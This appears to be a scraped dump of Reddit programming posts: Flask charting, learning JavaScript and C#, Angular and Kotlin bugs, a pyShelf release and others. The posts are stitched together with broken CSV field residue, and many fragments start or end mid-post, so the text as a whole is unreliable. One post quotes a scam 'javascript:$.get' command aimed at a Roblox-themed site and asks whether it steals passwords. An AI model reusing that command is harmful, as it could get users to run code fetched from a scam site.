I'm looking for a fairly simple way to display some side project data at home on a webpage.  I've tried ELK - and while I set it up successfully, the amount of system resources required exceeds what I have available to me on a publicly accessible web server at the moment (I have two boxes on the web, and each is just a single core, 1 GB RAM box) - I essentially needed at least a dual core box, 4 GB RAM, and that was cutting things pretty slim.  Basically I'd say ELK is a lot of overhead for my purposes...and not really what I'm looking for in a publicly accessible 'blog' style site.

Regarding matplotlib/pandas, I've always rather avoided using these.  I've got a pretty good grasp of processing the data similar to how (I believe) pandas would with a list of dicts or a csv DictReader object, etc.  I find the overhead to be just more than what I need - essentially it's doing the same thing I'm already doing, without the requirement of learning the library.  Quite possibly the answer is that I need to learn pandas, maybe this functionality exists in the library, I'm not sure what path to head down.

I use Flask on my web server to route requests and render the pages, etc for the viewer.

I'm fairly familiar with javascript, as I use this on the pages to send POST requests and, say, update a div with the response dynamically.

**Anyway...onto the meat of this post...**

I'm looking to have some articles that talk about numbers, and relationships between those numbers, and a nice way to add charts that represent those numbers to the audience.  I'd like for the charts to be interactive - ie. when a user moves their mouse over the line in the chart, the numbers from the data points are visible in a tooltip, etc.

Does anyone have a suggestion on what to use to create no nonsense charts such as this?

I can easily make my data CSV or JSON format if needing to pass into a web page and have javascript process/display it.  I could provide key, value pairs, etc...I just don't really know what path to start down to create the charts.  I've created some charts using plotly, and while the charts turned out ok, the only real solution I found was to make the chart, screenshot it, and then use the resultant png (or jpeg) to display the data to the user, but obviously this loses the interactiveness of the chart.  I realize I could create these jpegs on the fly through python, and this would eliminate the screenshot process, but still, this loses that interactiveness.

**Thanks for sticking with the post, and I appreciate any feedback of what path I should head down.**",Suggestion for creating charts in web page

I keep seeing when it comes to separating frontend and backend, many people suggest creating a backend and front separate and making API calls to the backend.  To my knowledge, this is essentially a completely separate app as an api.

When it comes to scaling, i.e., taking an application to both the web and mobile, is creating the backend as an API and then creating the mobile and web app separately to then just call the API the best route?

""Since I’ve mentioned that I recently learned JavaScript, people have asked me how and what I recommend. So here’s my experience and best advice for 2020.""

Excellent learning tips. Step by step advice. 

* First step: Learn plain JavaScript

First, it’s important to learn plain JavaScript.

* How to begin

Don’t just learn from little bits of tutorials, tips, or tricks online. Instead, you want a real foundation and solid understanding. 

Start with the book: “[Head First JavaScript Programming](https://www.oreilly.com/library/view/head-first-javascript/9781449340124/)”.

Do [Free Code Camp](https://www.freecodecamp.org/)

* Make it stick

Write down every new thing you learn, ideally into a flashcard program.

* Reinforce it

quickly read through a few more books like these:

  * [You Don’t Know JS — by Kyle Simpson](https://leanpub.com/ydkjsy-get-started)

  * [Rediscovering JavaScript — by Venkat Subramaniam](https://pragprog.com/titles/ves6/)

  * [Effective JavaScript — by David Herman](http://effectivejs.com/)

These books will go faster, now that you’re fluent. 

* Avoid the shortcuts

Do it the hard way. Solve everything yourself with plain JavaScript. It’s the best way to learn.

* What next?
If you had a web app in mind, start building it now. (OK, you can use shortcuts.)",Solid learning Advice: How to learn JavaScript By Derek Sivers (Thank you)

Now I don't have the numbers to back my claim and it very well maybe a perception issue however whenever I need to learn something related to python I can quickly find resources which are high quality and deliver to their claim. For example want to learn web developement, cs50 is a great course(uses python for backend), want to learn Pandas, ML several channels will pop up or if you want to learn a specific library or something related to the Python programming language you have likes of sentdex and Corey Schafer on YouTube. The situation around javascript is same too, freecodecamp is completely structured around javascript or even if you just search for any framework related to it and you will find crash courses, detailed courses and extensive articles written around it.

However from my experience I cannot find variety of material in case of C#, want to learn Blazor Web Assembly hardly any comprehensive series available, few are there which have the right content but then lack the production quality, similarly if you wish to learn asp.net core hardly any variety is available which teaches you the framework in depth. Search for web api and you be confused by different tutorials with some teaching .net framework while others trying to teach MVC along with it. Xamarin is another technology which lacks detailed tutorials and the list goes on.

Yes we do have series like 101 series by Microsoft which teach C#, ASP.net and related technologies but they hardly provide material which has depth to it. Their docs and text based tutorials are great and do teach a lot.

Now this YouTube video tells you to type at the top of your browser "" javascript:$.get('[//](https://rblx.link/)\[Scam Website') "". The scam website is ""rblx \[dot\] link"". But I won't actually insert the link to avoid anyone clicking on it.

Personally I don't actually know any JavaScript so I came to this forum to see if any of you know what this command actually does, because I believe doing that script would grab your password, or something along those lines.

TL;DR: I need to know what ""javascript:$.get('[//](https://rblx.link/)\[LINK')"" does.

Thanks!",[AskJS] Javascript password hijacker?

**Why did I choose this project?** 

Writing simple scrips on C++ was fun but I always felt that because I didn’t understand how to utilize databases, my programs were never really able to be utilized the way I had planned them to be. So when my mom asked if I could build her a small program to track the checks she used, I immediately took onto the idea with the goal to learn some simple database with this endeavor.  

**Building Experience** 

One of the first new experience was actually talking to my mom and asking exactly what she wanted. Being able to think about my skill sets and being realistic of how to I can implement her ideas into the program to make things as seamless for her was a challenge. After we had settled with a basic structure, I started coding! 

I initially started this project with C++ since I was much more comfortable with the syntax as well as the IDE. After searching the web for some basic GUI building methods, I soon learned that there weren’t many resources, for C++ at least. I did give one tutorial a try and I was able to create a very simple display. 

[https://youtu.be/dmYaTfrV8lE](https://youtu.be/dmYaTfrV8lE)

This was the first video I used to guide me through the process but many of the functions and classes didn’t seem to work well for me. The main issue however was that I wasn’t able to find much help on using C++’s built-in form window GUI. I tried to take a look at the documentation but this is my first project that I really started and finished myself, so the documentation really didn’t make any sense to me.  

This led to on a path to find a simpler GUI library to use. I had already played around with Tkinter on python and truthfully I really didn’t find it that much more intuitive. From what I heard, building on a web-based language like Javascript, I believe, should be pretty easy, but I really don’t have much experience in Javascript other than basic syntax. I have seen online that Pyqt5 was a popular GUI library to use on python so I decided to give this a try.  

Building with Pyqt5 turned out to be a very enjoyable and fun experience. I started watching this series: 

[https://www.youtube.com/playlist?list=PLzMcBGfZo4-lB8MZfHPLTEHO9zJDDLpYj](https://www.youtube.com/playlist?list=PLzMcBGfZo4-lB8MZfHPLTEHO9zJDDLpYj)

Creating the actual GUI was such a seamless and intuitive process. I do not know how things work in industry, but for this beginner project on python, I really enjoyed the experience. I would simply just drag and drop things into the designer and export the GUI to code.  

The next step was to actually implement different functions behind the code. I believe this would be considered back end code or something. Anyways, the first thing I noticed was that Pyqt5 created the entire GUI window as a class. How perfect because I had just finished my first intro CS course which ended with classes! Now, this was a chance to be able to practice and implement these skills in a different language. Following the above series tips, basically I would just be building in additional class functions and connecting the buttons, text boxes, and data tables to their respective in-class functions.  

At this point, I realized I needed to start the implementation of the database. I wanted to work with Mysql initially since its more popular in a sense. I had tried to build another program that I wasn’t able to complete using Mysql. But after researching more, I found SQLite was built into the python library already. This was meant to be an easier to use, simple database that you could use for small to intermediate-sized programs. This was super nice because the data could be stored locally in the same file. I wouldn’t have to worry about creating some cloud account. The actual database creation and table creation actually turned out to be pretty similar to MySQL. In fact, inserting data, deleting data, updating data, and querying data all seemed very similar. Even though the basic functionality of this program didn’t really require any advanced database query systems and it only really used one table, it was pretty easy to do all the things I needed to do. The only interesting part was probably working on the keyword query which I felt was fun for some reason. At the end of the day, being able to create something with a database was a huge accomplishment for me and I am proud of it. I hope to continue to learn more and build bigger and more advanced programs! 

After a week or so of learning, trial and error, and coding, I was finally able to learn how to turn my .py file to a .exe and export it to my mom! Having finished my first project on python using SQlite and Pyqt5 honestly made me really excited and I just want to code more now! 

**Challenges and What I learned** 

One of the biggest challenges overall was learning by myself. Since I didn't have a teacher to help me, I spent most of my time watching videos, trying to understand documentation, reading through the libraries I was using, and posting on Reddit for help haha. I guess at the end of the day, we have to learn how to use the resources at our disposal and complete what we set out to do. I felt much more motivated to finish because this program was for my mom! Even simple tasks like aligning the columns would take hours to research. But I learned a lot from these experiences. I feel a little more comfortable reading some simple library documentation now. I also understand how to use classes much more effectively. I feel more comfortable reaching through the class functions of new libraries and understanding how to call them. Lastly, I learned there is a whole world of people out on the internet willing to help out if you just ask. I will have to learn to ask better questions on stack exchange since I was banned because people kept downvoting my simpler questions :(, but on Reddit, I was able to find much more help when it came to these questions and for all that helped, I appreciate it so much! I still have much to improve so I will continue to try to learn! 

A second challenge was actually troubleshooting and checking with my mom. With misunderstanding on both ends, I ended up having to restructure my program multiple times which did frustrate me. Reflecting back on this, I realize that this is probably how it will be if I end up building things for other people. I will have to learn how to explain my ideas and understand other people's ideas much more effectively.  

**Overall Program!** 

This program allows you to store check information in a simple display and database. You are able to update, save, and delete queries that should all display in a table. There is a keyword search which should pull up all the queries with the typed phrase in the description. If empty, It will just show all the entries. I forgot to mention above but when you press the print button, It will create a PDF with the results currently in the data table so you can print. This was also fun to work on and learn about the report lab library.  That pretty wraps up my basic program which I will link the GitHub below! 

[https://github.com/alexlin51/Python-Financial-Tracker](https://github.com/alexlin51/Python-Financial-Tracker)

**How do I want to develop further?** 

I built this entire program on one .py file.  I just learned in C++ that in industry and practice, we should separate out the files into different header files and .cpp. Not sure how this applies to python but I plan to look into it! 

The program still has some issues like the balance column is somehow anchored to the upper right edge instead of the middle right edge. Also, depending on the screen size, the GUI may look strange and now intended. Not sure how to fix this either but I plan on looking into being able to also add a way to scale the entire program when we minimize or expand it. For now it simply just remains the same but opens up more grey space.  

I initially had images but I didn’t know how to include it in the .exe file so that’ll be fun to explore as well. Also, If I had more .py files, I want to learn how that can affect the final .exe file.  

Maybe one day I would like to try learning different GUIs like the above-mentioned ones in javascript. I think I heard that this is usually the practice in industry, so It should be useful to learn!

3896,2020-07-03 10:18:56,4,1,"Hey,

I was writing a program in Python/Flask/ JS that uses an API to get data and sends it to the javascript code to graph it. However, my python code is only sending empty data for some reason. I know the API works because I'm using it elsewhere in the program as well.

Here's my code:

1. Python:

`def lookup(symbol):`

`""""""Look up quote for symbol.""""""`

&amp;#x200B;

`# Contact API`

`try:`

`api_key = os.environ.get(""API_KEY"")`

`response = requests.get(f""`[`https://cloud-sse.iexapis.com/stable/stock/{urllib.parse.quote_plus(symbol)}/quote?token={api_key}`](https://cloud-sse.iexapis.com/stable/stock/{urllib.parse.quote_plus(symbol)}/quote?token={api_key})`"")`

`response.raise_for_status()`

`except requests.RequestException:`

`return None`

&amp;#x200B;

`# Parse response`

`try:`

`quote = response.json()`

`return {`

`""name"": quote[""companyName""],`

`""price"": float(quote[""latestPrice""]),`

`""symbol"": quote[""symbol""]`

`}`

`except (KeyError, TypeError, ValueError):`

`return None`

2. Flask

`from flask import Flask, flash, jsonify, redirect, render_template, request, session`

`@app.route(""/graph"")`

`@login_required`

`def graph():`

`""""""Get stock quote.""""""`

`info = lookup(symbol1)`

`return jsonify(result=float(info[""price""]))`

3. JavaScript

`$.getJSON('/graph',function(data) {`

`y1 = data;`

`yVal = data;`

`}`

	`);`

I've obviously left out a lot of code, but everything works except for the part where python is supposed to return a value to JS. All my files are saved locally so the ""/graph"" call should hopefully work. The JQuery is calling the python function and my API is being accessed, but the returned variable 'data' is null apparently.

I hate this requirement of parenthesis around an assignment, for me it seems to communicate things that are not true (""this is an expression, we are going to use the return value""). Also it doesn't allow for a semicolon-free coding style (which may be a good thing for some people, but I don't like it), since otherwise the parenthesis might be interpreted as trying to call the previous line as a function. Also it's cumbersome to wrap assignments.

So I've came up with the following trick for reassignment instead. Staying with the example from the second stackoverflow link, you can simply write

     let {} = { latitude, longitude } = props.userLocation.coords

This works, needs no parenthesis, needs no semicolons, and doesn't pollute the namespace with any more variables. And while it still doesn't communicate the correct thing clearly (""a destructuring reassignment is happening here""), at least it doesn't seem to communicate anything else either (or worst case it communicates ""what the heck is this"").

That's it, just wanted to let y'all know about this, maybe someone else finds this useful too. And, of course, if someone has an even better solution, I'm all ears.

3940,2020-08-02 12:31:49,9,1,"# Intro:

I've been trying to learn C# over some years now, I should have been much better by now, but various excuses got in the way.  I only know fundamentals, and some beginner understanding of OOP, and can make some smaller desktop-utilities.  


But I have some projects I really want to try out now, so I want to pay other people to do them for me.   
In the beginning I just wanted the projects done in Winforms/WPF, because at least I would have the option of later editing the program someone made for me, so I wouldn't have to pay for every little change. And by studying their code I could also learn a little C# along the way. 

But with some of my projects they fit a homepage much better than a desktop-program.

So I guess I could just have, the persons doing my projects for me, make a homepage with javascript etc.   
But I have zero experience with javascript (everything web-related actually, apart from basic HTML).

# So I was thinking:

Since it would be best if some of the projects are made as websites, and I still want to be able to edit it later on, and it has to be in C#...   
Wouldn't Blazor be a good answer to that?  
Basically requiring  the people who would do my projects, that they do it in Blazor, and then I would at least have some idea what was going on in the code, since it's still C# code... 

&amp;#x200B;

Or would that be a bad/unrealistic idea?   


Am asking because I'm not exactly rich, and I did intend to spend a few thousand dollars on various projects, and I would of course prefer it didn't end up in a complete disaster.",Learning C# by paying for projects on sites like Freelancer.

I've noticed that within the learnprogramming community, one of the main pain points seems to be that early-stage/beginner devs consistently get stuck. They:  


  
\- Take on projects that are too large in scope  
\- Get stuck on pretty trivial bugs that absorb days of their time  
\- Don't know which technologies to learn/invest in  
\- Have many broader career/job application questions  
\- Don't know what it's like on the inside (actually being a dev)  


And that they would benefit tremendously from having a mentor (say 30 min/2 weeks cadence) coaching them on the above points.

3982,2020-08-24 18:20:26,23,1,"  I have been lost in my programming journey. I started out teaching myself C# by watching tutorials on youtube and videos on Udemy.  I really enjoyed it, but my progress was slowing way down and wasn't as self motivated as I should be.  I felt like I needed a structure to follow and something to make me accountable (I have never really been good at self motivation). 

  That's when I decided to look into boot camps. I have a friend of a friend that suggested Galvanize/Hack Reactor. He went there and got a nice paying job soon after graduation. I looked into the camp and noticed two things, one: they were teaching more web development (javascript) and not standalone program creation like Java or C#, and two: it costs $18,000. That is pretty expensive! But I do know myself, and that cost will motivate me and make me accountable. 

  After studying up on javascript and going through Galvanize's pre study program I realized I don't care for javaspript as much as C#. I don't really care that it is only web based, and building websites don't tickle my fancy.  I would rather build a standalone application. The thing I really enjoyed with C# is that I like the idea of creating games, and create programs that I can turn into an app on my phone. Also the syntax of C# seems easier and more clean. 

  I started to look for code camps that I can attend in C# but couldn't really find any. Everyone wants to teach you web development. So pretty much I got supper deflated the other day and felt lost. I just had my first kid a month ago (which is amazing), but I am super unhappy with my current job. My wife is encouraging me to go all in and do what I need to do to change my career. I want to make this change now while my son is young so I can spend more time with him when he's moving around.  

  I would love some advice on what to do. Should I switch back to C# and just keep doing tutorials (and hopefully stay motivated)? Or take the code camp to help me push through? One of he only class/C# structured learning I ran into was Tim Corry's complete C# course for $250 (way less than the boot camp). I just fear that me teaching myself without a step by step process won't get anywhere and time will keep on ticking by. Also supposedly jobs will want you to know javascript as well as C# (or at least that is what I am seeing). And the code camp hopefully will help me find a job after graduation vs me self studying C# and being lost on when to start looking for a job and to know when I'm ready.

  Thank you for reading this and any advice you can give me would be super helpful. If you have any questions let me know and I will get back to you.",I am feeling deflated and don't know what direction to take

4012,2020-09-06 07:26:49,6,1,"Sorry if this is a really basic question. I am relatively new to javascript (and after this typescript). 

I am making an angular app, which has 2 arrays of objects. The first is fetched from a REST service, and the second is a locally stored  JSON. 

I made a model as follows

     
    export interface MenuAction {
 menuId: string;
 actionId: string;
 actionType: string;
 updIndic: string; 
 description: string; 
 longDesc?:string;
 image?: string;
}

My local Json looks like this. 

&amp;#x200B;

    [{
 ""actionId"" : ""0010"",
 ""image"" : ""policy.jpg"",
 ""text"" : ""Actions related to policy system configuration. For example, configuration of affinity agreements""

},
{
 ""actionId"" : ""0020"",
 ""image"" : ""account.jpg"",
 ""text"" : ""Account system configuration""
}]

&amp;#x200B;

Then in my component.ts, I have done the following. 

    ------------
    import menuDetails from '../../../data/menu_details.json'; 
     ------
    menuActions : MenuAction[]; 

&amp;#x200B;

I tried this in ngInit, but I am missing something. 

&amp;#x200B;

     
    ngOnInit(): void {
 this._menuaction.getMenuActions('0002').subscribe (data =&gt; {
 this.data = data; 
 this.menuActions = this.data.content.userMenu.nbaUserMenuViewArray; 
 
 console.log (menuDetails); 
 // Loop all of the menuactions

 let index;
 for (let action of this.menuActions) {
 
 // Find the right details object 
 index = menuDetails.findIndex(x =&gt; x.actionId === action.actionId);
 console.log ('Found at '+ index);
 this.menuActions[action].longDesc = menuDetails[index].text;   // This line fails, as ""action"" is not the index. 
    }     
        });

4022,2020-09-15 10:07:48,12,1,"So since I followed a thread over a /r/stadia where some workaround apps where running I decided to make a specialized app that can run stadia on iOS in full-screen mode. Currently, I figured out a way to funnel my controller data through WKWebkit in a consistent manner. It's good to know that this solution will not be releasable to the Appstore ever. So it needs to be built manually through Xcode or someone needs to make a signed IPA out of it and distribute it that way. (it will work only for iOS14.x users since I'm using some new API's to make it work)

Currently, I made it work with my Xbox one controller but ps4 should work too (if the button mappings are not any different). Can't test this since I don't own any :)

I'll be releasing the source somewhere this week so you guys can tinker with it. currently, it's not pretty it could benefit from some javascript and CSS hacks to make it look more pretty.

# Release Highlights

* Docker Support  
pyShelf is now fully integrated with docker. You can have a pyShelf instance up in minutes! Install docker, and docker-compose, then run docker-compose up. Your admin login:pass will be pyshelf:pyshelf. login, navigate to /admin and create a new superuser :-)
* Mobi Support  
I reworked the backend to be more modular with the importing of book files, consequently future file type support should be a bit easier. As of this release we currently support epub, and mobi filetypes. pdf, cbz, rtf &amp; txt are in the plans.
* User System  
The user system is tied into not only administering django, you can now also run a book scan on demand from the web-ui. Did I mention the favorites system?
* Favorites System

It's been \~6 months since my last release, and I have taken alot of the feedback from the community into consideration while working on this release. As such an easy solution to get a pyShelf instance up and running quickly was of primary importance.

Along with the switch over to a more ""docker centric"" deployment I have also modified the infrastructure requirements most importantly no longer requiring a webserver to run the Django frontend. Instead hosting django with daphne, and serving static files via whitenoise.

pyShelf is now also running its own websocket server on port 1337, (what, it's an easy port to remember) currently it only responds to ping requests, and importBooks, expect a small client in the future. 

&gt;I live in the terminal, and knew i wanted a quick way from the terminal to remotely manage my library, I originally intended on going with plain sockets, however javascript doesn't tmk have a standard socket library, but it does have decent websocket support.

^(It's up to you whether or not you expose this port outside of a network you control, I wouldn't recommend it though, and take no responsibility if you do.)

I have alot more planned for the future of pyShelf, and look forward to your feedback. Anyone is welcome to contribute to the development of pyshelf. Just jump in to Discord (Invite link on [pyshelf.com](https://pyshelf.com)), or start making pull requests, or issues on GitHub.

4034,2020-09-20 13:43:54,13,1,"I am originally a javascript developer, but when I saw the wwdc2020 I decided it was time to learn swift. Apple open sourcing swift shows they want it to be used on more than just their devices.

Right now google is pushing swift for tensorflow really hard. Combine that with CoreML and you have two very powerful AI/ML frameworks using swift. SwiftNIO and Vapor provide a pretty good foundation for server programming. And since Apple needs this anyway for their own services I wonder if it's just a matter of time before they start writing their backends in swift.

Swift 5.3 brings windows support. And I hear some big changes on memory ownership and concurrent programming are coming in swift 6 too. This may be a good way of preventing defections to Rust.

So now that Apple is consolidating on a single instruction set and controls the output hardware, they could do all sorts of swift specific optimizations. Improving swift performance.

With a rich company like Apple supporting it, I feel like sky's the limit for swift.",Does anyone else think Apple's use of a single chip architecture bodes well for swift long term?

Now by following google tutorials and documentation,stack overflow and stuff like that,  i have managed to build a website and it's hosted on client's network. Now the thing is , me being a juniour developer, I am certain that I have done things in the most in-efficient ways. For instance, I have not followed any design pattern and my business logic is strongly coupled to my dto and also i Have a single controller with 4000 lines of code. In short everything is cluttered.

I dont have any senior dot-net developers who could help me out with this since our organisation is not huge. just want help to follow the best practises that are in the MVC world. Like following design patterns and stuff like that. It would be very helpful if some-one guides me with best practises or shares a git-hub project which is following all the best practises for asp.net mvc project.

4070,2020-10-08 12:57:26,19,1,"Hey, so I had this idea of creating a ""Single file headless C.M.S"" for some years now as we go more towards REST API than having fully fledged C.M.S systems like WordPress. I also soon have to hand in my bachelor project description and thought this would be a nice project to work on.

## Some of the decisions why this project seems a good idea (to me) are that:
- Single file - easy to use and upload anywhere, no need to run any commands or similar, it just works out of the box (after you configured the database which you do in the browser)
- No third party dependencies like composer - The host where you want to upload your C.M.S might not have composer enabled
- A smaller and better alternative to other Headless/Headful C.M.S's which either are bloated (WordPress) or require additional server features a user might not have
- Aimed for small to medium sized websites with small budgets and just need the basics
- Extendable with simply creating one more file and then overwriting areas of the first file.

## My doubts/thoughts/concerns, on the other hands are that:
- the whole C.M.S depends on one file. All logic, styling, javascript and markup happens inside this file. This could very likely affect performance?
- Security wise - how bad of an idea is it to have everything in one file? What should i be on the lookout for? How much do i publicly expose that could lead to breaches?
- It would be madness to develop only on one single file - I therefore thought about creating some kind of ""development setup and structure"" with multiple files and then later to combine them using a script - how would i best achieve structuring and setting this up?
- Database - I thought about giving the user the ability to choose between flat file or mysql database to store data - this, however, requires me to create multiple query classes from ground up that probably requires a lot of work. Also, flat files sound like a very performance decreasing solution for multiple users reading/writing to them. Or is there any php class that already exists and has abstract classes for multiple databases?
- File generation - The user should of course have the ability to upload images. Also, as soon as a user creates a new Item (maybe Post, or whatever they need it for) - I somehow need somewhere to store the api schema. Most probably inside a file. Meaning the single file will also generate several files in directories like `/api/item.php` or `/media/image.jpg`.
- Is there a character/line limit that a single php file may have?
- How likely am I to break something if everything happens inside one file?
- Sqlite as database? I've worked with Sqlite3 before but never installed or configured it myself. Does using sqlite require you to install any engine or run any commands? Or is it also just adding some flat files and it works out of the box?

As you might noticed, there are many concerns that keep me away from creating such a C.M.S, but the idea to do so is also very intriguing. 

How would you develop such a C.M.S?

&gt; I've seen something similar, [Adminer](https://github.com/vrana/adminer/) which is a single file alternative to phpMyAdmin. They, however, still use composer in some way.","Single file, headless C.M.S without third party dependencies (aka composer) - How dumb does this idea sound to you? How would you develop it?"

But  as I work for over 2 years with JavaScript every day, I must admire,  that I really enjoy it. I like it\`s broad areas of usage (browsers,  servers, native applications, even IoT), package managing (that may be controversial, I know), and  especially open source projects that grown around JS, like Vue, Svelte,  React, deno, nvm or volta, whole JAMStack thing, and countles more  amazing projects. There was a chatoic time after ES6 release, but now,  it is with us for few years. There are many bundlers and build tools  available, and everyone can choose something that best suits their  needs.

4096,2020-10-21 14:09:25,1,1," 

i built a webapp using flask for api and javascript for front (no framework) i try to add ads just to see how it works not to actually make money yet as i have almost zero users. Adsense rejected my application for not having enough content. The thing is that it has content but you have to sign in first. I searched around the net and found out that a lot of people have problem monetizing their web app with ads for the same reason but not actual info on the solution.

Does anyone has any experience in the topic?

my home page is here

[https://leadingpace.netlify.app/](https://leadingpace.netlify.app/)

so the problem is that web crawlers don't have access to my actual content. The question is how to get them access or is there another ad network specific for these apps?",[AskJS] how to add ads on a webapp(not website)

4098,2020-10-22 16:02:22,2,1,"**Motivation**

To put it bluntly, the official way to check your ballot(s) status in the state of Georgia is not great. It struggles to deal with situations where you have multiple ballots because one has been rejected for whatever reason. A friend was having issues trying to see if his most recent ballot had been accepted, [so I decided to take matters into my own hands](https://georgia-voter-frontend.herokuapp.com/).

All Georgia absentee and early voter information is publicly available (glad to share the URL or you can check within the data_import.py function in the fastapi_voter_project), so I decided to make a simple little API to allow for more easy viewing of your voter information.

**Note:** I am a cheap human being unwilling to pay for the service to keep the container API running all the time on Heroku, so if the results take longer than expected to return it's because that container is resuming from a stopped state.

**Backend**

[Project Link](https://github.com/theBusBoy/fastapi_voter_project) 

Initially, I built out the API capabilities in flask (as it's what I'm most familiar with), but when I began containerizing it I became aware of [FastAPI](https://fastapi.tiangolo.com/) for the first time. Since this was just a casual hobbyist project, I decided that now was a better time than ever to try out a new api framework.

FastAPI will likely become my new standard for API building as I thoroughly enjoy many of the conventions/framework paradigms it follows. For anyone wanting to learn more, the tutorial on the site is phenomenal.

While I usually do all database work in Postgres, I initially just planned for this to be a nice little tool for myself and figured that sqlite would be fine for my use case as I'm really just querying a denormalized output csv from the state. I will say that I don't have much experience with sqlite, and if this weren't just a ""5 day build it and leave it"" project I absolutely would migrate this to Postgres or MariaDB.

**Frontend**
[Project Link](https://github.com/theBusBoy/voter_project_frontend)

I loathe frontend work mostly because I hate javascript and (stubbornly) refuse to learn typescript (and I'm also trash). Maybe one day I'll stop this behavior but for now you get to see another react-bootstrap baby's first react app implementation. 

If someone who enjoys javascript and react wants to refactor HomePage.js and VoterCard.js to not be a blight on society I'm all for it.

**Deployment**
I normally do all of my personal project work in AWS (because it's what I have to do all my professional work in), so I decided to change it up this time and do a fully dockerized deployment on Heroku. I like Heroku as a platform, and I understand their constraint where ports for apps are assigned at runtime, but it was an absolute pain in the ass for someone who isn't as familiar with docker (and especially dockerizing react apps) to inject the environment variable port at runtime. This whole post gets made yesterday instead of today if I was able to find better resources about this, and eventually I just struck gold and adapted OKTA's [article](https://developer.okta.com/blog/2020/06/24/heroku-docker-react) to make it work. I'm a data engineer by trade who usually gets to sit within my comfy databricks or other SaaS DE tools, so I'm pretty proud of myself for navigating the docker world to make this thing happen.",Check My Status (GA currently) Backend FastAPI and Frontend React (both dockerized) project

I've decided that I'm going for js, html, css for fronted and c# for backend and sql for databases if needed.

As for the questions im wondering:
- whether I should learn these languages themselves and then apply them to webdev after? 
- and considering I have prior programming knowledge of other languages what length could I expect the project to last?
- do I need to consider any other choices also or should I rethink any of my choices?

An overly complicated set up process (such as configuring Webpack, Babel, and other compilers). Dependency bloat. The list goes on. React (and other front end frameworks) serve their purpose for the current state of Javascript in 2020, but I can definitely see newer and better tools becoming the hot new thing in the next few years.

4151,2020-11-11 15:25:02,2,1,"So I've got this table, and the tbody rows are populated via a PHP-to-javascript statement. This part works very well.

One cell in each row contains a countdown timer and is updated every second using setInterval. This part works very well. Since there are many rows, there is a for loop:

    for (i = 0; i &lt; allRows.length; i++) { update the row's timer; } 

When the countdown timer reaches 0:00 for a row, I want the row to disappear. I found that if I tried to delete a row while the for loop was ""executing"" then the row indices got all messed up and the code went to a crapper. So what I did was for a row that went to 0:00, I set the class to be 'expired'. This class has display: none, so the rows visually disappears, but isn't deleted from the DOM.

Then, when the setInterval runs again (which is 1 second later), **but before the for loop** to update timer again, I want to run something that will delete all rows with a class of 'expired'. This part I cannot get to work.

Most recent code is here:

    // updateExpiresIn runs every 1000ms
    function updateExpiresIn() {
         var expiredRows = document.getElementsByClassName('expired');
          if (expiredRows.length &gt; 0) expiredRows.deleteRow[0];
          for (i = 0; i &lt; allRows.length; i++) tableRows.rows[i].cells[1].innerHTML = Math.floor(expiresIn / 60) + ':' + ('0'+Math.floor(expiresIn % 60)).slice(-2);
          if (expiresIn == 0) tableRows.rows[i].className = 'expired';
    }

4185,2020-11-22 15:34:12,4,1,"Hi!

I'm working on a function that loops over an array (with arrays) and then replaces the text on a few divs with the value of index 1 of the nested arrays.

But only with these conditions:

* the nested array needs to have a specific (string) value on index 0 (which is 'categorie 1')
* it should only give the value of index 1 of the nested array **if the value of index 1 is a unique value** (I mean, if there are other nested arrays with the same value inside index 1, it is not unique. I do not mean unique inside the nested array itself).

The function get's activated by an event handler (clicking on 'Categorie 1', see codepen). When clicking on categorie 1, the following values: **themaA1 themaA2 themaA3 themaA4 themaA5 themaA6**(each value in a different div) should be visible inside the divs of the green container (see codepen).

Unfortunately I'm not able to get it work.

What does work is looping and putting data in the different divs which shares the same value on index 0. See code below.

    function displayThemes() {    let theme = ""i"";    for (let i = 0; i &lt; forms.length; i++) {      theme = forms[i][1];       if (forms[i][0] === ""Categorie 1"")         document.getElementById(""theme"" + i).innerHTML = theme;   } }  

What does not work is getting the right data in the divs (only the unique values).

I got this far (see code below) but it does not work unfortunately.

    function displayThemes() {    let theme = ""i"";    for (let i = 0; i &lt; forms.length; i++) {      theme = forms[i][1];       if (forms[i][0] === ""Categorie 1"" &amp;&amp; forms[i][1] !== theme)         document.getElementById(""theme"" + i).innerHTML = theme;   } }  

Here is the full code with interface: [https://codepen.io/cheizer66/pen/pobXBmy](https://codepen.io/cheizer66/pen/pobXBmy)

I'm not sure why it does not work. What am I doing wrong? What should you do differently? What could make it work? I hope I stated the problem clear enough and looking forward to your respons!

4196,2020-11-24 21:40:09,2,1,"Hello everyone !  


I'm still trying to learn Jetpack Compose (Multiplatform in this case but I don't think it matters ?) and there is something I cannot seem to find online.  


Let's say I have a component (a Composable Function) with a state written like so :

    val (counter, setCounter) = remember { mutableStateOf(0) }

If I want to create a `incrementCounter()` function to prevent writing `setCounter(counter + 1)` each time, inside my component I can write :

    fun incrementCounter(value = 1) { setCounter(counter + value) }

But doing so, Jetpack Compose will behave weirdly and won't update the counter each time.  
If I instead declare it like that :

    val incrementCounter = fun(value: Int) { setCounter(counter + value) }

It work without any problem ! The only problem is that I cannot use default values with this syntax.  
It reminds me of the arrow function in javascript and the reference of `this` .  


Does anybody have an idea ? Is it possible to write an internal function in a Jetpack Compose component ?",Internal functions in Jetpack Compose ?
4197,2020-11-25 03:09:00,2,1,"I've been writing a multiplatform library on Kotlin 1.3.x using Intellij Idea.

When I upgrade the version of Kotlin to 1.4, the IDE can't resolve common libraries such as kotlinx.coroutines.

It would say, for instance, unresolved reference: 'Deferred' for kotlinx.coroutines.Deferred.

The code still builds fine, but it flags them as errors in the code editor.

Also, the IR javascript compiler seems to have issues with testing suspend functions.

Previously, I tested suspend functions with the following hacky code:

    actual fun testSuspend(
    	context: CoroutineContext,
    	block: suspend CoroutineScope.() -&gt; Unit
    ): dynamic = GlobalScope.promise(context = context, block = block)

Hi guys

As the title says, newbie me needs help refactoring my game code.

I was learning how to use html canvas and in got hooked on it. Learning how to draw a circle led into a 700 lines of javascript game.

Without any sort of architecture, it´s very hard to read and probably modify

I would like some pointers on what design pattern I should try to follow and how to do it?

I would probably split into 3 differente files, one for gameData another for Dom relalted stuff, and then the core functionality of the game.

Problem is, not sure how would i go about doing this..

Here is the github repo if anyone wants to give it a go?

I dont want to ask stupid beginnerquestions and dont looking for free Support. There are so many other questions like: 

what is github and how do I use it?

4231,2020-12-06 21:06:18,16,1,"So I'm working on creating a react library (for personal use) and decided that this would be a good place to finally wrap my head around typescript.  I have a background in c++, C#, and Java as well as extensive experience with React and javascript.  


The challenge I'm running into I know I could solve in an instant with a class, but I'm trying to be good about sticking to functional components as much as possible.  


I've created a distilled (if not 100% accurate) recreation of my problem here.  First, the proptypes:

